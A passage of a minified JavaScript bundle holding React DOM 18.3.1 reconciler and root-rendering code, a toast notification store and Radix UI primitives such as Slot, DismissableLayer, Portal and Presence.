r=t.pingCache;r!==null&&r.delete(e),e=Rt(),t.pingedLanes|=t.suspendedLanes&n,ot===t&&(ut&n)===n&&(nt===4||nt===3&&(ut&130023424)===ut&&500>Ge()-rv?vs(t,0):nv|=n),Kt(t,e)}function SS(t,e){e===0&&(t.mode&1?(e=qc,qc<<=1,!(qc&130023424)&&(qc=4194304)):e=1);var n=Rt();t=kr(t,e),t!==null&&(rc(t,e,n),Kt(t,n))}function KR(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),SS(t,n)}function GR(t,e){var n=0;switch(t.tag){case 13:var r=t.stateNode,i=t.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=t.stateNode;break;default:throw Error($(314))}r!==null&&r.delete(e),SS(t,n)}var bS;bS=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||Ht.current)Bt=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return Bt=!1,DR(t,e,n);Bt=!!(t.flags&131072)}else Bt=!1,Me&&e.flags&1048576&&kC(e,ad,e.index);switch(e.lanes=0,e.tag){case 2:var r=e.type;Pu(t,e),t=e.pendingProps;var i=Ao(e,Ct.current);ho(e,n),i=Qg(null,e,r,t,i,n);var s=Xg();return e.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,Wt(r)?(s=!0,sd(e)):s=!1,e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,Wg(e),i.updater=ah,e.stateNode=i,i._reactInternals=e,im(e,r,t,n),e=am(null,e,r,!0,s,n)):(e.tag=0,Me&&s&&Fg(e),It(null,e,i,n),e=e.child),e;case 16:r=e.elementType;e:{switch(Pu(t,e),t=e.pendingProps,i=r._init,r=i(r._payload),e.type=r,i=e.tag=YR(r),t=Cn(r,t),i){case 0:e=om(null,e,r,t,n);break e;case 1:e=P_(null,e,r,t,n);break e;case 11:e=N_(null,e,r,t,n);break e;case 14:e=k_(null,e,r,Cn(r.type,t),n);break e}throw Error($(306,r,""))}return e;case 0:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Cn(r,i),om(t,e,r,i,n);case 1:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Cn(r,i),P_(t,e,r,i,n);case 3:e:{if(lS(e),t===null)throw Error($(387));r=e.pendingProps,s=e.memoizedState,i=s.element,jC(t,e),ud(e,r,null,n);var o=e.memoizedState;if(r=o.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=s,e.memoizedState=s,e.flags&256){i=Mo(Error($(423)),e),e=R_(t,e,r,n,i);break e}else if(r!==i){i=Mo(Error($(424)),e),e=R_(t,e,r,n,i);break e}else for(en=_i(e.stateNode.containerInfo.firstChild),tn=e,Me=!0,In=null,n=OC(e,null,r,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(Oo(),r===i){e=Pr(t,e,n);break e}It(t,e,r,n)}e=e.child}return e;case 5:return MC(e),t===null&&tm(e),r=e.type,i=e.pendingProps,s=t!==null?t.memoizedProps:null,o=i.children,Qp(r,i)?o=null:s!==null&&Qp(r,s)&&(e.flags|=32),aS(t,e),It(t,e,o,n),e.child;case 6:return t===null&&tm(e),null;case 13:return cS(t,e,n);case 4:return Kg(e,e.stateNode.containerInfo),r=e.pendingProps,t===null?e.child=Do(e,null,r,n):It(t,e,r,n),e.child;case 11:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Cn(r,i),N_(t,e,r,i,n);case 7:return It(t,e,e.pendingProps,n),e.child;case 8:return It(t,e,e.pendingProps.children,n),e.child;case 12:return It(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(r=e.type._context,i=e.pendingProps,s=e.memoizedProps,o=i.value,Pe(ld,r._currentValue),r._currentValue=o,s!==null)if(Mn(s.value,o)){if(s.children===i.children&&!Ht.current){e=Pr(t,e,n);break e}}else for(s=e.child,s!==null&&(s.return=e);s!==null;){var a=s.dependencies;if(a!==null){o=s.child;for(var c=a.firstContext;c!==null;){if(c.context===r){if(s.tag===1){c=Cr(-1,n&-n),c.tag=2;var u=s.updateQueue;if(u!==null){u=u.shared;var p=u.pending;p===null?c.next=c:(c.next=p.next,p.next=c),u.pending=c}}s.lanes|=n,c=s.alternate,c!==null&&(c.lanes|=n),nm(s.return,n,e),a.lanes|=n;break}c=c.next}}else if(s.tag===10)o=s.type===e.type?null:s.child;else if(s.tag===18){if(o=s.return,o===null)throw Error($(341));o.lanes|=n,a=o.alternate,a!==null&&(a.lanes|=n),nm(o,n,e),o=s.sibling}else o=s.child;if(o!==null)o.return=s;else for(o=s;o!==null;){if(o===e){o=null;break}if(s=o.sibling,s!==null){s.return=o.return,o=s;break}o=o.return}s=o}It(t,e,i.children,n),e=e.child}return e;case 9:return i=e.type,r=e.pendingProps.children,ho(e,n),i=gn(i),r=r(i),e.flags|=1,It(t,e,r,n),e.child;case 14:return r=e.type,i=Cn(r,e.pendingProps),i=Cn(r.type,i),k_(t,e,r,i,n);case 15:return sS(t,e,e.type,e.pendingProps,n);case 17:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:Cn(r,i),Pu(t,e),e.tag=1,Wt(r)?(t=!0,sd(e)):t=!1,ho(e,n),nS(e,r,i),im(e,r,i,n),am(null,e,r,!0,t,n);case 19:return uS(t,e,n);case 22:return oS(t,e,n)}throw Error($(156,e.tag))};function TS(t,e){return ZE(t,e)}function qR(t,e,n,r){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function hn(t,e,n,r){return new qR(t,e,n,r)}function av(t){return t=t.prototype,!(!t||!t.isReactComponent)}function YR(t){if(typeof t=="function")return av(t)?1:0;if(t!=null){if(t=t.$$typeof,t===Tg)return 11;if(t===Ig)return 14}return 2}function Ci(t,e){var n=t.alternate;return n===null?(n=hn(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function Ou(t,e,n,r,i,s){var o=2;if(r=t,typeof t=="function")av(t)&&(o=1);else if(typeof t=="string")o=5;else e:switch(t){case qs:return ys(n.children,i,s,e);case bg:o=8,i|=8;break;case Np:return t=hn(12,n,e,i|2),t.elementType=Np,t.lanes=s,t;case kp:return t=hn(13,n,e,i),t.elementType=kp,t.lanes=s,t;case Pp:return t=hn(19,n,e,i),t.elementType=Pp,t.lanes=s,t;case ME:return uh(n,i,s,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case DE:o=10;break e;case jE:o=9;break e;case Tg:o=11;break e;case Ig:o=14;break e;case Zr:o=16,r=null;break e}throw Error($(130,t==null?t:typeof t,""))}return e=hn(o,n,e,i),e.elementType=t,e.type=r,e.lanes=s,e}function ys(t,e,n,r){return t=hn(7,t,r,e),t.lanes=n,t}function uh(t,e,n,r){return t=hn(22,t,r,e),t.elementType=ME,t.lanes=n,t.stateNode={isHidden:!1},t}function Wf(t,e,n){return t=hn(6,t,null,e),t.lanes=n,t}function Kf(t,e,n){return e=hn(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function QR(t,e,n,r,i){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Tf(0),this.expirationTimes=Tf(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Tf(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function lv(t,e,n,r,i,s,o,a,c){return t=new QR(t,e,n,a,c),e===1?(e=1,s===!0&&(e|=8)):e=0,s=hn(3,null,null,e),t.current=s,s.stateNode=t,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Wg(s),t}function XR(t,e,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Gs,key:r==null?null:""+r,children:t,containerInfo:e,implementation:n}}function IS(t){if(!t)return Di;t=t._reactInternals;e:{if(Os(t)!==t||t.tag!==1)throw Error($(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(Wt(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error($(171))}if(t.tag===1){var n=t.type;if(Wt(n))return IC(t,n,e)}return e}function NS(t,e,n,r,i,s,o,a,c){return t=lv(n,r,!0,t,i,s,o,a,c),t.context=IS(null),n=t.current,r=Rt(),i=Ei(n),s=Cr(r,i),s.callback=e??null,wi(n,s,i),t.current.lanes=i,rc(t,i,r),Kt(t,r),t}function dh(t,e,n,r){var i=e.current,s=Rt(),o=Ei(i);return n=IS(n),e.context===null?e.context=n:e.pendingContext=n,e=Cr(s,o),e.payload={element:t},r=r===void 0?null:r,r!==null&&(e.callback=r),t=wi(i,e,o),t!==null&&(Dn(t,i,o,s),Iu(t,i,o)),o}function yd(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function z_(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function cv(t,e){z_(t,e),(t=t.alternate)&&z_(t,e)}function JR(){return null}var kS=typeof reportError=="function"?reportError:function(t){console.error(t)};function uv(t){this._internalRoot=t}hh.prototype.render=uv.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error($(409));dh(t,e,null,null)};hh.prototype.unmount=uv.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;Ss(function(){dh(null,t,null,null)}),e[Nr]=null}};function hh(t){this._internalRoot=t}hh.prototype.unstable_scheduleHydration=function(t){if(t){var e=oC();t={blockedOn:null,target:t,priority:e};for(var n=0;n<ti.length&&e!==0&&e<ti[n].priority;n++);ti.splice(n,0,t),n===0&&lC(t)}};function dv(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function fh(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function B_(){}function ZR(t,e,n,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var u=yd(o);s.call(u)}}var o=NS(e,r,t,0,null,!1,!1,"",B_);return t._reactRootContainer=o,t[Nr]=o.current,bl(t.nodeType===8?t.parentNode:t),Ss(),o}for(;i=t.lastChild;)t.removeChild(i);if(typeof r=="function"){var a=r;r=function(){var u=yd(c);a.call(u)}}var c=lv(t,0,!1,null,null,!1,!1,"",B_);return t._reactRootContainer=c,t[Nr]=c.current,bl(t.nodeType===8?t.parentNode:t),Ss(function(){dh(e,c,n,r)}),c}function ph(t,e,n,r,i){var s=n._reactRootContainer;if(s){var o=s;if(typeof i=="function"){var a=i;i=function(){var c=yd(o);a.call(c)}}dh(e,o,t,i)}else o=ZR(n,e,t,i,r);return yd(o)}iC=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=qa(e.pendingLanes);n!==0&&(Pg(e,n|1),Kt(e,Ge()),!(me&6)&&(Lo=Ge()+500,Gi()))}break;case 13:Ss(function(){var r=kr(t,1);if(r!==null){var i=Rt();Dn(r,t,1,i)}}),cv(t,1)}};Rg=function(t){if(t.tag===13){var e=kr(t,134217728);if(e!==null){var n=Rt();Dn(e,t,134217728,n)}cv(t,134217728)}};sC=function(t){if(t.tag===13){var e=Ei(t),n=kr(t,e);if(n!==null){var r=Rt();Dn(n,t,e,r)}cv(t,e)}};oC=function(){return xe};aC=function(t,e){var n=xe;try{return xe=t,e()}finally{xe=n}};$p=function(t,e,n){switch(e){case"input":if(Op(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var r=n[e];if(r!==t&&r.form===t.form){var i=ih(r);if(!i)throw Error($(90));FE(r),Op(r,i)}}}break;case"textarea":$E(t,n);break;case"select":e=n.value,e!=null&&ao(t,!!n.multiple,e,!1)}};GE=iv;qE=Ss;var eA={usingClientEntryPoint:!1,Events:[sc,Js,ih,WE,KE,iv]},Ua={findFiberByHostInstance:cs,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},tA={bundleType:Ua.bundleType,version:Ua.version,rendererPackageName:Ua.rendererPackageName,rendererConfig:Ua.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Lr.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=XE(t),t===null?null:t.stateNode},findFiberByHostInstance:Ua.findFiberByHostInstance||JR,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var su=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!su.isDisabled&&su.supportsFiber)try{eh=su.inject(tA),Zn=su}catch{}}on.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=eA;on.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!dv(e))throw Error($(200));return XR(t,e,null,n)};on.createRoot=function(t,e){if(!dv(t))throw Error($(299));var n=!1,r="",i=kS;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(i=e.onRecoverableError)),e=lv(t,1,!1,null,null,n,!1,r,i),t[Nr]=e.current,bl(t.nodeType===8?t.parentNode:t),new uv(e)};on.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error($(188)):(t=Object.keys(t).join(","),Error($(268,t)));return t=XE(e),t=t===null?null:t.stateNode,t};on.flushSync=function(t){return Ss(t)};on.hydrate=function(t,e,n){if(!fh(e))throw Error($(200));return ph(null,t,e,!0,n)};on.hydrateRoot=function(t,e,n){if(!dv(t))throw Error($(405));var r=n!=null&&n.hydratedSources||null,i=!1,s="",o=kS;if(n!=null&&(n.unstable_strictMode===!0&&(i=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(o=n.onRecoverableError)),e=NS(e,null,t,1,n??null,i,!1,s,o),t[Nr]=e.current,bl(t),r)for(t=0;t<r.length;t++)n=r[t],i=n._getVersion,i=i(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,i]:e.mutableSourceEagerHydrationData.push(n,i);return new hh(e)};on.render=function(t,e,n){if(!fh(e))throw Error($(200));return ph(null,t,e,!1,n)};on.unmountComponentAtNode=function(t){if(!fh(t))throw Error($(40));return t._reactRootContainer?(Ss(function(){ph(null,null,t,!1,function(){t._reactRootContainer=null,t[Nr]=null})}),!0):!1};on.unstable_batchedUpdates=iv;on.unstable_renderSubtreeIntoContainer=function(t,e,n,r){if(!fh(n))throw Error($(200));if(t==null||t._reactInternals===void 0)throw Error($(38));return ph(t,e,n,!1,r)};on.version="18.3.1-next-f1338f8080-20240426";function PS(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(PS)}catch(t){console.error(t)}}PS(),PE.exports=on;var ac=PE.exports;const RS=vE(ac);var AS,V_=ac;AS=V_.createRoot,V_.hydrateRoot;const nA=1,rA=1e6;let Gf=0;function iA(){return Gf=(Gf+1)%Number.MAX_SAFE_INTEGER,Gf.toString()}const qf=new Map,H_=t=>{if(qf.has(t))return;const e=setTimeout(()=>{qf.delete(t),al({type:"REMOVE_TOAST",toastId:t})},rA);qf.set(t,e)},sA=(t,e)=>{switch(e.type){case"ADD_TOAST":return{...t,toasts:[e.toast,...t.toasts].slice(0,nA)};case"UPDATE_TOAST":return{...t,toasts:t.toasts.map(n=>n.id===e.toast.id?{...n,...e.toast}:n)};case"DISMISS_TOAST":{const{toastId:n}=e;return n?H_(n):t.toasts.forEach(r=>{H_(r.id)}),{...t,toasts:t.toasts.map(r=>r.id===n||n===void 0?{...r,open:!1}:r)}}case"REMOVE_TOAST":return e.toastId===void 0?{...t,toasts:[]}:{...t,toasts:t.toasts.filter(n=>n.id!==e.toastId)}}},Du=[];let ju={toasts:[]};function al(t){ju=sA(ju,t),Du.forEach(e=>{e(ju)})}function Te({...t}){const e=iA(),n=i=>al({type:"UPDATE_TOAST",toast:{...i,id:e}}),r=()=>al({type:"DISMISS_TOAST",toastId:e});return al({type:"ADD_TOAST",toast:{...t,id:e,open:!0,onOpenChange:i=>{i||r()}}}),{id:e,dismiss:r,update:n}}function oA(){const[t,e]=v.useState(ju);return v.useEffect(()=>(Du.push(e),()=>{const n=Du.indexOf(e);n>-1&&Du.splice(n,1)}),[t]),{...t,toast:Te,dismiss:n=>al({type:"DISMISS_TOAST",toastId:n})}}function ie(t,e,{checkForDefaultPrevented:n=!0}={}){return function(i){if(t==null||t(i),n===!1||!i.defaultPrevented)return e==null?void 0:e(i)}}function aA(t,e){typeof t=="function"?t(e):t!=null&&(t.current=e)}function OS(...t){return e=>t.forEach(n=>aA(n,e))}function We(...t){return v.useCallback(OS(...t),t)}function lA(t,e=[]){let n=[];function r(s,o){const a=v.createContext(o),c=n.length;n=[...n,o];function u(f){const{scope:h,children:E,..._}=f,y=(h==null?void 0:h[t][c])||a,C=v.useMemo(()=>_,Object.values(_));return d.jsx(y.Provider,{value:C,children:E})}function p(f,h){const E=(h==null?void 0:h[t][c])||a,_=v.useContext(E);if(_)return _;if(o!==void 0)return o;throw new Error(`\`${f}\` must be used within \`${s}\``)}return u.displayName=s+"Provider",[u,p]}const i=()=>{const s=n.map(o=>v.createContext(o));return function(a){const c=(a==null?void 0:a[t])||s;return v.useMemo(()=>({[`__scope${t}`]:{...a,[t]:c}}),[a,c])}};return i.scopeName=t,[r,cA(i,...e)]}function cA(...t){const e=t[0];if(t.length===1)return e;const n=()=>{const r=t.map(i=>({useScope:i(),scopeName:i.scopeName}));return function(s){const o=r.reduce((a,{useScope:c,scopeName:u})=>{const f=c(s)[`__scope${u}`];return{...a,...f}},{});return v.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return n.scopeName=e.scopeName,n}var Fo=v.forwardRef((t,e)=>{const{children:n,...r}=t,i=v.Children.toArray(n),s=i.find(uA);if(s){const o=s.props.children,a=i.map(c=>c===s?v.Children.count(o)>1?v.Children.only(null):v.isValidElement(o)?o.props.children:null:c);return d.jsx(_m,{...r,ref:e,children:v.isValidElement(o)?v.cloneElement(o,void 0,a):null})}return d.jsx(_m,{...r,ref:e,children:n})});Fo.displayName="Slot";var _m=v.forwardRef((t,e)=>{const{children:n,...r}=t;if(v.isValidElement(n)){const i=hA(n);return v.cloneElement(n,{...dA(r,n.props),ref:e?OS(e,i):i})}return v.Children.count(n)>1?v.Children.only(null):null});_m.displayName="SlotClone";var DS=({children:t})=>d.jsx(d.Fragment,{children:t});function uA(t){return v.isValidElement(t)&&t.type===DS}function dA(t,e){const n={...e};for(const r in e){const i=t[r],s=e[r];/^on[A-Z]/.test(r)?i&&s?n[r]=(...a)=>{s(...a),i(...a)}:i&&(n[r]=i):r==="style"?n[r]={...i,...s}:r==="className"&&(n[r]=[i,s].filter(Boolean).join(" "))}return{...t,...n}}function hA(t){var r,i;let e=(r=Object.getOwnPropertyDescriptor(t.props,"ref"))==null?void 0:r.get,n=e&&"isReactWarning"in e&&e.isReactWarning;return n?t.ref:(e=(i=Object.getOwnPropertyDescriptor(t,"ref"))==null?void 0:i.get,n=e&&"isReactWarning"in e&&e.isReactWarning,n?t.props.ref:t.props.ref||t.ref)}function hv(t){const e=t+"CollectionProvider",[n,r]=lA(e),[i,s]=n(e,{collectionRef:{current:null},itemMap:new Map}),o=E=>{const{scope:_,children:y}=E,C=H.useRef(null),x=H.useRef(new Map).current;return d.jsx(i,{scope:_,itemMap:x,collectionRef:C,children:y})};o.displayName=e;const a=t+"CollectionSlot",c=H.forwardRef((E,_)=>{const{scope:y,children:C}=E,x=s(a,y),w=We(_,x.collectionRef);return d.jsx(Fo,{ref:w,children:C})});c.displayName=a;const u=t+"CollectionItemSlot",p="data-radix-collection-item",f=H.forwardRef((E,_)=>{const{scope:y,children:C,...x}=E,w=H.useRef(null),S=We(_,w),N=s(u,y);return H.useEffect(()=>(N.itemMap.set(w,{ref:w,...x}),()=>void N.itemMap.delete(w))),d.jsx(Fo,{[p]:"",ref:S,children:C})});f.displayName=u;function h(E){const _=s(t+"CollectionConsumer",E);return H.useCallback(()=>{const C=_.collectionRef.current;if(!C)return[];const x=Array.from(C.querySelectorAll(`[${p}]`));return Array.from(_.itemMap.values()).sort((N,R)=>x.indexOf(N.ref.current)-x.indexOf(R.ref.current))},[_.collectionRef,_.itemMap])}return[{Provider:o,Slot:c,ItemSlot:f},h,r]}function fA(t,e){const n=v.createContext(e),r=s=>{const{children:o,...a}=s,c=v.useMemo(()=>a,Object.values(a));return d.jsx(n.Provider,{value:c,children:o})};r.displayName=t+"Provider";function i(s){const o=v.useContext(n);if(o)return o;if(e!==void 0)return e;throw new Error(`\`${s}\` must be used within \`${t}\``)}return[r,i]}function Xo(t,e=[]){let n=[];function r(s,o){const a=v.createContext(o),c=n.length;n=[...n,o];const u=f=>{var x;const{scope:h,children:E,..._}=f,y=((x=h==null?void 0:h[t])==null?void 0:x[c])||a,C=v.useMemo(()=>_,Object.values(_));return d.jsx(y.Provider,{value:C,children:E})};u.displayName=s+"Provider";function p(f,h){var y;const E=((y=h==null?void 0:h[t])==null?void 0:y[c])||a,_=v.useContext(E);if(_)return _;if(o!==void 0)return o;throw new Error(`\`${f}\` must be used within \`${s}\``)}return[u,p]}const i=()=>{const s=n.map(o=>v.createContext(o));return function(a){const c=(a==null?void 0:a[t])||s;return v.useMemo(()=>({[`__scope${t}`]:{...a,[t]:c}}),[a,c])}};return i.scopeName=t,[r,pA(i,...e)]}function pA(...t){const e=t[0];if(t.length===1)return e;const n=()=>{const r=t.map(i=>({useScope:i(),scopeName:i.scopeName}));return function(s){const o=r.reduce((a,{useScope:c,scopeName:u})=>{const f=c(s)[`__scope${u}`];return{...a,...f}},{});return v.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return n.scopeName=e.scopeName,n}var mA=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","span","svg","ul"],pe=mA.reduce((t,e)=>{const n=v.forwardRef((r,i)=>{const{asChild:s,...o}=r,a=s?Fo:e;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),d.jsx(a,{...o,ref:i})});return n.displayName=`Primitive.${e}`,{...t,[e]:n}},{});function jS(t,e){t&&ac.flushSync(()=>t.dispatchEvent(e))}function sn(t){const e=v.useRef(t);return v.useEffect(()=>{e.current=t}),v.useMemo(()=>(...n)=>{var r;return(r=e.current)==null?void 0:r.call(e,...n)},[])}function gA(t,e=globalThis==null?void 0:globalThis.document){const n=sn(t);v.useEffect(()=>{const r=i=>{i.key==="Escape"&&n(i)};return e.addEventListener("keydown",r,{capture:!0}),()=>e.removeEventListener("keydown",r,{capture:!0})},[n,e])}var vA="DismissableLayer",wm="dismissableLayer.update",yA="dismissableLayer.pointerDownOutside",_A="dismissableLayer.focusOutside",W_,MS=v.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),mh=v.forwardRef((t,e)=>{const{disableOutsidePointerEvents:n=!1,onEscapeKeyDown:r,onPointerDownOutside:i,onFocusOutside:s,onInteractOutside:o,onDismiss:a,...c}=t,u=v.useContext(MS),[p,f]=v.useState(null),h=(p==null?void 0:p.ownerDocument)??(globalThis==null?void 0:globalThis.document),[,E]=v.useState({}),_=We(e,T=>f(T)),y=Array.from(u.layers),[C]=[...u.layersWithOutsidePointerEventsDisabled].slice(-1),x=y.indexOf(C),w=p?y.indexOf(p):-1,S=u.layersWithOutsidePointerEventsDisabled.size>0,N=w>=x,R=xA(T=>{const b=T.target,P=[...u.branches].some(k=>k.contains(b));!N||P||(i==null||i(T),o==null||o(T),T.defaultPrevented||a==null||a())},h),j=EA(T=>{const b=T.target;[...u.branches].some(k=>k.contains(b))||(s==null||s(T),o==null||o(T),T.defaultPrevented||a==null||a())},h);return gA(T=>{w===u.layers.size-1&&(r==null||r(T),!T.defaultPrevented&&a&&(T.preventDefault(),a()))},h),v.useEffect(()=>{if(p)return n&&(u.layersWithOutsidePointerEventsDisabled.size===0&&(W_=h.body.style.pointerEvents,h.body.style.pointerEvents="none"),u.layersWithOutsidePointerEventsDisabled.add(p)),u.layers.add(p),K_(),()=>{n&&u.layersWithOutsidePointerEventsDisabled.size===1&&(h.body.style.pointerEvents=W_)}},[p,h,n,u]),v.useEffect(()=>()=>{p&&(u.layers.delete(p),u.layersWithOutsidePointerEventsDisabled.delete(p),K_())},[p,u]),v.useEffect(()=>{const T=()=>E({});return document.addEventListener(wm,T),()=>document.removeEventListener(wm,T)},[]),d.jsx(pe.div,{...c,ref:_,style:{pointerEvents:S?N?"auto":"none":void 0,...t.style},onFocusCapture:ie(t.onFocusCapture,j.onFocusCapture),onBlurCapture:ie(t.onBlurCapture,j.onBlurCapture),onPointerDownCapture:ie(t.onPointerDownCapture,R.onPointerDownCapture)})});mh.displayName=vA;var wA="DismissableLayerBranch",LS=v.forwardRef((t,e)=>{const n=v.useContext(MS),r=v.useRef(null),i=We(e,r);return v.useEffect(()=>{const s=r.current;if(s)return n.branches.add(s),()=>{n.branches.delete(s)}},[n.branches]),d.jsx(pe.div,{...t,ref:i})});LS.displayName=wA;function xA(t,e=globalThis==null?void 0:globalThis.document){const n=sn(t),r=v.useRef(!1),i=v.useRef(()=>{});return v.useEffect(()=>{const s=a=>{if(a.target&&!r.current){let c=function(){FS(yA,n,u,{discrete:!0})};const u={originalEvent:a};a.pointerType==="touch"?(e.removeEventListener("click",i.current),i.current=c,e.addEventListener("click",i.current,{once:!0})):c()}else e.removeEventListener("click",i.current);r.current=!1},o=window.setTimeout(()=>{e.addEventListener("pointerdown",s)},0);return()=>{window.clearTimeout(o),e.removeEventListener("pointerdown",s),e.removeEventListener("click",i.current)}},[e,n]),{onPointerDownCapture:()=>r.current=!0}}function EA(t,e=globalThis==null?void 0:globalThis.document){const n=sn(t),r=v.useRef(!1);return v.useEffect(()=>{const i=s=>{s.target&&!r.current&&FS(_A,n,{originalEvent:s},{discrete:!1})};return e.addEventListener("focusin",i),()=>e.removeEventListener("focusin",i)},[e,n]),{onFocusCapture:()=>r.current=!0,onBlurCapture:()=>r.current=!1}}function K_(){const t=new CustomEvent(wm);document.dispatchEvent(t)}function FS(t,e,n,{discrete:r}){const i=n.originalEvent.target,s=new CustomEvent(t,{bubbles:!1,cancelable:!0,detail:n});e&&i.addEventListener(t,e,{once:!0}),r?jS(i,s):i.dispatchEvent(s)}var CA=mh,SA=LS,ji=globalThis!=null&&globalThis.document?v.useLayoutEffect:()=>{},bA="Portal",fv=v.forwardRef((t,e)=>{var a;const{container:n,...r}=t,[i,s]=v.useState(!1);ji(()=>s(!0),[]);const o=n||i&&((a=globalThis==null?void 0:globalThis.document)==null?void 0:a.body);return o?RS.createPortal(d.jsx(pe.div,{...r,ref:e}),o):null});fv.displayName=bA;function TA(t,e){return v.useReducer((n,r)=>e[n][r]??n,t)}var qi=t=>{const{present:e,children:n}=t,r=IA(e),i=typeof n=="function"?n({present:r.isPresent}):v.Children.only(n),s=We(r.ref,NA(i));return typeof n=="function"||r.isPresent?v.cloneElement(i,{ref:s}):null};qi.displayName="Presence";function IA(t){const[e,n]=v.useState(),r=v.useRef({}),i=v.useRef(t),s=v.useRef("none"),o=t?"mounted":"unmounted",[a,c]=TA(o,{mounted:{UNMOUNT:"unmounted",ANIMATION_OUT:"unmountSuspended"},unmountSuspended:{MOUNT:"mounted",ANIMATION_END:"unmounted"},unmounted:{MOUNT:"mounted"}});return v.useEffect(()=>{const u=ou(r.current);s.current=a==="mounted"?u:"none"},[a]),ji(()=>{const u=r.current,p=i.current;if(p!==t){const h=s.current,E=ou(u);t?c("MOUNT"):E==="none"||(u==null?void 0:u.display)==="none"?c("UNMOUNT"):c(p&&h!==E?"ANIMATION_OUT":"UNMOUNT"),i.current=t}},[t,c]),ji(()=>{if(e){let u;const p=e.ownerDocument.defaultView??window,f=E=>{const 